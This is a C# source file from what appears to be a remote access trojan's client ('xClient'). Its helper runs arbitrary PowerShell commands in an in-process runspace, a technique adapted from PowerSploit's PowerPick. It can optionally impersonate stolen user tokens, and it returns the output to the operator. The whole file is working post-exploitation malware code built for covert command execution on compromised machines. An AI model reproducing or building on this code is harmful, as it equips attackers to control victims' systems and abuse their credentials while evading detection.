using System;
using System.IO;
using System.Resources;
using System.Collections.Generic;
using System.Linq;
using System.Security.Principal;
using System.Text;
using System.Net;
using xClient.Core.Commands;
//Powershell Libraries
using System.Collections.ObjectModel;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

namespace xClient.Core.Helper
{
    public class PowerPickHelper
    {
        public static string RunCommand(string command)
        {
            WindowsImpersonationContext context = null;
            if (CommandHandler.impersonate)
            {
                WindowsIdentity user = new WindowsIdentity(CommandHandler.impersonatedUsers[CommandHandler.impersonatedUser].DangerousGetHandle());
                context = user.Impersonate();
            }
            //Need to add functionality for loading Modules.
            //Should I store the runspace as part of the CommandHandler statics so that it doesn't get Re-Opened every time? Will need to see what gets open everytime this is called.
            //With help from the powersploit project. https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerPick/SharpPick/Program.cs
            Runspace runspace = RunspaceFactory.CreateRunspace();
            runspace.Open();
            RunspaceInvoke commandInvoker = new RunspaceInvoke(runspace);
            Pipeline pipeline = runspace.CreatePipeline();
            pipeline.Commands.AddScript(command);
            //So that we can return the content as a string to be returned to the client.
            pipeline.Commands.Add("Out-String");
            Collection<PSObject> results = pipeline.Invoke();
            runspace.Close();

            //Convert records to string.
            StringBuilder builder = new StringBuilder();
            foreach (PSObject obj in results)
            {
                builder.Append(obj);
            }
            if (CommandHandler.impersonate)
            {
                if (context != null)
                {
                    try
                    {
                        context.Undo();
                    }
                    finally
                    {
                        context.Dispose();
                        context = null;
                    }
                }
            }
            return builder.ToString().Trim();
        }
    }
}
